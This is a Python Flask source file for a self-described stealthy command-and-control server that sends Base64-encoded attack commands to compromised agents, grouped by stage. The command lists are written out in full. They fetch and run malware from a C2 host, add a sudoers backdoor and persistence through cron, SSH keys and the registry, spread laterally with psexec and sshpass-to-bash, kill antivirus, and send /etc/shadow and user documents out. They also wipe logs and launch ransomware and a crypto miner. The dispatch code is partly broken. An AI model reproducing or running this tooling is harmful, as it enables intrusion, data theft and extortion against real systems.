#!/usr/bin/env python3
"""
Enhanced Stealthy C2 Server using Python and Flask
----------------------------------------------------
Features:
- Runs as an HTTPS server on port 443.
- Maintains a dynamic command queue for each agent.
- Provides an admin endpoint to add commands to an agent's queue.
- Encodes commands with Base64 (and potentially further encrypts them).
- Logs check-ins, command dispatch, and execution metrics.
"""

import base64
import logging
import time
from flask import Flask, request, jsonify

app = Flask(__name__)

# Set up logging to console with timestamps
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')

# Dictionary mapping agent IDs to a list (queue) of commands.
# Each command is a dictionary with details such as type, payload, and timestamp.
import time





# order = [recon_commands, persistence_commands]


initial_access_commands = {
    "linux": [
        { "cmd": "wget http://C2_IP/malware.sh -O /tmp/.malware && chmod +x /tmp/.malware", "type": "download", "timestamp": time.time() },
        { "cmd": "curl -s http://C2_IP/beacon || ping -c 4 C2_IP", "type": "beacon", "timestamp": time.time() },
    ],
    "windows": [
        { "cmd": "certutil -urlcache -split -f http://C2_IP/malware.exe C:\\Windows\\Temp\\svchost.exe", "type": "download", "timestamp": time.time() },
        { "cmd": "bitsadmin /transfer malware /download /priority normal http://C2_IP/beacon C:\\beacon.txt", "type": "beacon", "timestamp": time.time() },
    ],
}

recon_commands = {
    "linux": [
        { "cmd": "echo 'Hello from C2!'", "type": "shell", "timestamp": time.time() },
        { "cmd": "whoami", "type": "shell", "timestamp": time.time() },
        { "cmd": "uname -a", "type": "shell", "timestamp": time.time() },
        { "cmd": "ifconfig || ip a", "type": "shell", "timestamp": time.time() },
        { "cmd": "netstat -antup", "type": "shell", "timestamp": time.time() },
        { "cmd": "cat /etc/passwd", "type": "shell", "timestamp": time.time() },
        { "cmd": "sudo -l", "type": "shell", "timestamp": time.time() },
    ],
    "windows": [        
        # Windows equivalents
        { "cmd": "whoami", "type": "shell", "timestamp": time.time() },
        { "cmd": "systeminfo", "type": "shell", "timestamp": time.time() },
        { "cmd": "ipconfig /all", "type": "shell", "timestamp": time.time() },
        { "cmd": "netstat -ano", "type": "shell", "timestamp": time.time() },
        { "cmd": "type C:\\Windows\\System32\\drivers\\etc\\hosts", "type": "shell", "timestamp": time.time() },
        { "cmd": "net user", "type": "shell", "timestamp": time.time() },
        { "cmd": "whoami /priv", "type": "shell", "timestamp": time.time() },
    ],
}

privilege_escalation_commands = {
    "linux": [
        { "cmd": "find / -perm -4000 2>/dev/null", "type": "exploit_check", "timestamp": time.time() },  # SUID binaries
        { "cmd": "echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", "type": "exploit", "timestamp": time.time() },  # Sudo backdoor
    ],
    "windows": [
        { "cmd": "sc query state= all | findstr \"SERVICE_NAME\"", "type": "service_enum", "timestamp": time.time() },  # Service enumeration
        { "cmd": "powershell -ep bypass -c \"Add-Service -Name 'FakeService' -BinaryPath 'C:\\malware.exe'\"", "type": "exploit", "timestamp": time.time() },
    ],
}

persistence_commands = {
    "linux": [
        { "cmd": "(crontab -l ; echo \"@reboot /tmp/malware\") | crontab -", "type": "persistence", "timestamp": time.time() },
        { "cmd": "echo \"ssh-rsa ATTACKER_PUB_KEY\" >> ~/.ssh/authorized_keys", "type": "persistence", "timestamp": time.time() },
    ],
    "windows": [
        { "cmd": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"C:\\malware.exe\"", "type": "persistence", "timestamp": time.time() },
        { "cmd": "schtasks /create /tn \"Cleanup\" /tr \"C:\\malware.exe\" /sc hourly /mo 1", "type": "persistence", "timestamp": time.time() },
    ],
}

lateral_movement_commands = {
    "linux": [
        { "cmd": "sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@TARGET_IP 'curl http://C2_IP/malware | bash'", "type": "ssh", "timestamp": time.time() },
        { "cmd": "smbclient -U 'user%password' //TARGET_IP/share -c 'put malware'", "type": "smb", "timestamp": time.time() },
    ],
    "windows": [
        { "cmd": "psexec.exe \\\\TARGET_IP -u admin -p password -accepteula -d malware.exe", "type": "psexec", "timestamp": time.time() },
        { "cmd": "wmic /node:TARGET_IP process call create 'cmd /c malware.exe'", "type": "wmi", "timestamp": time.time() },
    ],
}

defense_evasion_commands = {
    "linux": [
        { "cmd": "chattr +i /tmp/malware", "type": "file_hiding", "timestamp": time.time() },  # Immutable file
        { "cmd": "kill -9 $(ps aux | grep '[a]ntivirus' | awk '{print $2}')", "type": "process_kill", "timestamp": time.time() },  # Kill AV
    ],
    "windows": [
        { "cmd": "attrib +h +s C:\\malware.exe", "type": "file_hiding", "timestamp": time.time() },  # Hide file
        { "cmd": "netsh advfirewall set allprofiles state off", "type": "disable_firewall", "timestamp": time.time() },
    ],
}

exfiltration_commands = {
    "linux": [
        { "cmd": "tar -czvf /tmp/stolen_data.tar.gz /etc/passwd /etc/shadow", "type": "archive", "timestamp": time.time() },
        { "cmd": "curl -X POST --data-binary @/tmp/stolen_data.tar.gz http://C2_IP/exfil", "type": "upload", "timestamp": time.time() },
    ],
    "windows": [
        { "cmd": "powershell Compress-Archive -Path C:\\Documents\\* -DestinationPath C:\\stolen.zip", "type": "archive", "timestamp": time.time() },
        { "cmd": "certutil -encode C:\\stolen.zip C:\\stolen.b64 && curl -F 'data=@C:\\stolen.b64' http://C2_IP/exfil", "type": "upload", "timestamp": time.time() },
    ],
}

exfiltration_commands = {
    "linux": [
        { "cmd": "tar -czvf /tmp/stolen_data.tar.gz /etc/passwd /etc/shadow", "type": "archive", "timestamp": time.time() },
        { "cmd": "curl -X POST --data-binary @/tmp/stolen_data.tar.gz http://C2_IP/exfil", "type": "upload", "timestamp": time.time() },
    ],
    "windows": [
        { "cmd": "powershell Compress-Archive -Path C:\\Documents\\* -DestinationPath C:\\stolen.zip", "type": "archive", "timestamp": time.time() },
        { "cmd": "certutil -encode C:\\stolen.zip C:\\stolen.b64 && curl -F 'data=@C:\\stolen.b64' http://C2_IP/exfil", "type": "upload", "timestamp": time.time() },
    ],
}

cleanup_commands = {
    "linux": [
        { "cmd": "shred -zu /var/log/auth.log", "type": "log_wipe", "timestamp": time.time() },
        { "cmd": "history -c && rm -f ~/.bash_history", "type": "history_wipe", "timestamp": time.time() },
    ],
    "windows": [
        { "cmd": "wevtutil cl security", "type": "log_wipe", "timestamp": time.time() },
        { "cmd": "del /f /q C:\\malware.exe", "type": "file_deletion", "timestamp": time.time() },
    ],
}   

payload_commands = {
    "linux": [
        { "cmd": "./malware --encrypt --key ATTACKER_KEY", "type": "ransomware", "timestamp": time.time() },
        { "cmd": "nohup ./miner -o xmr.pool.com -u WALLET_ADDRESS &", "type": "cryptojacking", "timestamp": time.time() },
    ],
    "windows": [
        { "cmd": "malware.exe --encrypt --key ATTACKER_KEY", "type": "ransomware", "timestamp": time.time() },
        { "cmd": "start /B miner.exe -o xmr.pool.com -u WALLET_ADDRESS", "type": "cryptojacking", "timestamp": time.time() },
    ],
}

order = [
    initial_access_commands,
    recon_commands,
    privilege_escalation_commands,
    persistence_commands,
    lateral_movement_commands,
    exfiltration_commands,
    defense_evasion_commands,
    cleanup_commands,
    payload_commands,
]


# Dictionary to log metrics for each agent (e.g., last check-in time, response times).
agent_metrics = {}

@app.route('/c2', methods=['POST'])
def c2_endpoint():
    """
    Primary endpoint for agent check-ins.
    Agents send a JSON payload with their "id". The server responds with the next command (if any).
    """
    try:
        data = request.get_json(force=True)
        stg = data.get("stg")
        if not stg:
            logging.warning("Received invalid stage command")
            return jsonify({"error": "Missing agent ID"}), 400

        # Record the check-in time for metrics.
        checkin_time = time.time()
        agent_metrics.setdefault((stg), {})['last_checkin'] = checkin_time
        logging.info(f"Agent at stage={stg} checked in at {checkin_time:.2f}")

        # Get the next command from the agent's command queue.
        # if recon_commands.get(agent_id) and len(recon_commands[agent_id]) > 0:
        #     command_data = recon_commands[agent_id].pop(0)
        #     command_text = command_data.get("cmd")
        # else:
        #     # Default command if no pending commands.
        #     command_text = "NOP"

        if(order.get(stg) and len(order[stg]) > 0):
            command_data = order[stg].pop(0)
            command_text = command_data.get("cmd")
        else:
            command_text = "NOP"
        
        # Encode the command using URL-safe Base64 encoding.
        encoded_command = base64.urlsafe_b64encode(command_text.encode()).decode()
        response = {
            "stg": stg,
            "status": "active",
            "timestamp": checkin_time,
            "cmd": encoded_command  # The command is delivered in an obfuscated format.
        }
        
        logging.info(f"Dispatched command to agent for stage {stg}: {command_text}")
        return jsonify(response), 200

    except Exception as e:
        logging.error(f"Error processing agent check-in: {e}")
        return jsonify({"error": "Invalid request format"}), 400

@app.route('/admin/add_command', methods=['POST'])
def add_command():
    """
    Admin endpoint to add a new command to an agent's queue.
    Expects a JSON payload with "agent_id", "cmd", and optionally "type" (default: "shell").
    """
    try:
        data = request.get_json(force=True)
        stg = data.get("stg")
        cmd = data.get("cmd")
        cmd_type = data.get("type", "shell")

        if not stg or not cmd:
            return jsonify({"error": "Missing agent_id or cmd"}), 400

        # Append the command with the current timestamp.
        command_entry = {
            "cmd": cmd,
            "type": cmd_type,
            "timestamp": time.time()
        }
        order[stg].setdefault(stg, []).append(command_entry)
        logging.info(f"Admin added command for agent at {stg}: {cmd}")
        return jsonify({"message": "Command added successfully"}), 200

    except Exception as e:
        logging.error(f"Error adding command: {e}")
        return jsonify({"error": "Invalid request format"}), 400

if __name__ == '__main__':
    # For production, use valid TLS certificates.
    tls_context = ('cert.pem', 'key.pem')
    app.run(host='0.0.0.0', port=443, ssl_context=tls_context)
